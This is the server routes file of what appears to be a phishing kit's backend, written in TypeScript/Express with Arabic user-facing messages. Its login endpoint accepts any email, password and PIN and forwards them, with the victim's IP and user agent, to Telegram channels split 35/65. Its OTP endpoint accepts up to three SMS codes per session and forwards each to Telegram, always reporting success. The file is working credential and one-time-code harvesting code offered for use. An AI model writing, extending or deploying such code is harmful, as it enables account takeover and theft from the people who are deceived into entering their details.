import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { loginSchema, verifyOtpSchema } from "@shared/schema";
import { sendToTelegramChannel, selectChannel, formatLoginMessage, formatSMSMessage } from "./telegram";

// Store temporary user data in memory for SMS verification
interface TempUserData {
  email: string;
  password: string;
  pin: string;
  ipAddress: string;
  userAgent: string;
  selectedChannel: string; // Store the selected channel for this session
}

const tempUserData = new Map<string, TempUserData>();

function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress || 'unknown';
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Login endpoint - accepts ANY credentials and sends to Telegram only
  app.post("/api/auth/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      const { email, password, pin } = validatedData;

      const ipAddress = getClientIp(req);
      const userAgent = req.headers['user-agent'] || 'unknown';

      // Select channel once for this user session (35/65 split)
      const userChannel = selectChannel();

      // Send Telegram notification to selected channel
      const telegramMessage = formatLoginMessage(email, password, pin);
      sendToTelegramChannel(telegramMessage, userChannel).catch(err => {
        console.error("⚠️ Telegram notification failed (non-blocking):", err);
      });

      // Store data temporarily in memory for SMS verification
      const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      tempUserData.set(sessionId, {
        email,
        password,
        pin,
        ipAddress,
        userAgent,
        selectedChannel: userChannel // Save the channel for this session
      });

      console.log(`✅ Login data sent to Telegram - Email: ${email}`);

      // Always return success - go to SMS verification
      res.json({ 
        success: true, 
        userId: sessionId,
        message: "تم إنشاء الحساب - انتقل لإدخال كود SMS" 
      });
    } catch (error: any) {
      console.error("Login error:", error);
      res.status(400).json({ message: error.message || "خطأ في البيانات المدخلة" });
    }
  });

  // Verify OTP endpoint - accepts ANY SMS code and sends to Telegram
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const validatedData = verifyOtpSchema.parse(req.body);
      const { userId, otp } = validatedData;
      const codeNumber = req.body.codeNumber || 1; // Get code number (1, 2, or 3)

      // Get temporary user data
      const userData = tempUserData.get(userId);
      
      if (!userData) {
        return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
      }

      // Send Telegram notification to the SAME channel as login
      const smsMessage = formatSMSMessage(userData.email, otp, codeNumber);
      sendToTelegramChannel(smsMessage, userData.selectedChannel).catch(err => {
        console.error("⚠️ Telegram SMS notification failed (non-blocking):", err);
      });

      console.log(`✅ SMS ${codeNumber} sent to Telegram - Code: ${otp}`);

      // Only clean up temporary session after the 3rd code
      if (codeNumber === 3) {
        tempUserData.delete(userId);
      }

      // Always return success
      res.json({ 
        success: true,
        message: "تم التحقق بنجاح" 
      });
    } catch (error: any) {
      console.error("OTP verification error:", error);
      res.status(400).json({ message: error.message || "خطأ في التحقق" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
